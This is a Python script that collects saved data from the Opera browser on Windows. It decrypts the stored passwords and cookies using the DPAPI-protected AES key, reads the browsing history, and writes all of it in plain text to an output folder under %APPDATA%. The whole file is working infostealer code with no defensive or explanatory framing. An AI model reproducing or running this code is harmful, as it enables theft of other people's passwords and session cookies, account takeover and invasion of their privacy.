import os
import json
import sqlite3
import base64
import shutil
import tempfile
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES

PROFILE_DIR = os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")
DEFAULT_DIR = os.path.join(PROFILE_DIR, "Default")

def get_aes_key():
    local_state_path = os.path.join(PROFILE_DIR, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_value, key):
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_value[15:-16])
            return decrypted_pass.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception:
        return None

def extract_passwords():
    key = get_aes_key()
    login_db = os.path.join(DEFAULT_DIR, "Login Data")
    if not os.path.exists(login_db):
        print("Login Data not found")
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for url, user, encrypted in cursor.fetchall():
        decrypted = decrypt_password(encrypted, key)
        data.append((url, user, decrypted))
    conn.close()
    os.remove(temp_db)
    return data

def extract_cookies():
    cookies_db = os.path.join(DEFAULT_DIR, "Network/Cookies")
    if not os.path.exists(cookies_db):
        print("Cookies not found")
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    key = get_aes_key()
    cookies = []
    for host, name, encrypted in cursor.fetchall():
        decrypted = decrypt_password(encrypted, key)
        cookies.append((host, name, decrypted))
    conn.close()
    os.remove(temp_db)
    return cookies

def extract_history():
    history_db = os.path.join(DEFAULT_DIR, "History")
    if not os.path.exists(history_db):
        print("History not found")
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(history_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = [row[0] for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return urls

if __name__ == "__main__":
    output_dir = os.path.expandvars(r"%APPDATA%\output\Browsers\Opera")
    os.makedirs(output_dir, exist_ok=True)

    passwords = extract_passwords()
    with open(os.path.join(output_dir, "passwords.txt"), "w", encoding="utf-8") as f:
        for url, user, pwd in passwords:
            f.write(f"URL: {url}\nUsername: {user}\nPassword: {pwd}\n\n")

    cookies = extract_cookies()
    with open(os.path.join(output_dir, "cookies.txt"), "w", encoding="utf-8") as f:
        for host, name, value in cookies:
            f.write(f"{host}\t{name}\t{value}\n")

    history = extract_history()
    with open(os.path.join(output_dir, "history.txt"), "w", encoding="utf-8") as f:
        for url in history:
            f.write(f"{url}\n")
